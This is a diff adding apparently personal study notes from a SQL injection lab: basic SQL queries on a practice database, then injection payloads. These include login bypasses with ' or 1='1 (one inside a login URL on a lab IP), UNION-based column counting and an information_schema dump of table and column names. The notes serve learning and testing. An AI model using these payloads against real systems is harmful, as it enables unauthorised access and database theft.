@@ -1,0 +1,48 @@
+select so we can select things
+union so we can combine things
+
+SHOW DATABASES;
+USE session;
+
+SHOW TABLES from session;
+select * from session.Tires;
+select * from (database.table);
+
+describe session.car;
+show tables;
+
+select * from session.car;
+select * from session.Tires;
+
+select * from session.car UNION SELECT tireid,name,size,cost FROM session.Tires;   #(produces error)needs padding for two columns to format properly
+
+select * from session.car UNION SELECT tireid,name,size,cost,1,2 FROM session.Tires;
+
+between and
+in
+where
+not between and
+not in
+
+select id from users where name='' and pass='';
+
+user: ' or 1='1
+pass: '
+
+user: tom' or 1='1
+
+10.50.31.91/login.php?username=' or 1='1 & passwd=' or 1='1
+f12 when login to see info
+
+the only thing you can get from a login page is usernames and passwords
+
+Audi' or 1='1    #try al the types at the start(audi,ford,Honda,dodge)
+Audi' UNION SELECT 1,2,3,4; #   #octothorpe is a comment which cancels out their query and just uses mine
+Audi' UNION SELECT 1,2,3,4,5; #    #same thing but testing if there is another column if last command ran an error
+
+step 1 
+step 2 find out how many columns there are
+
+
+Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
+
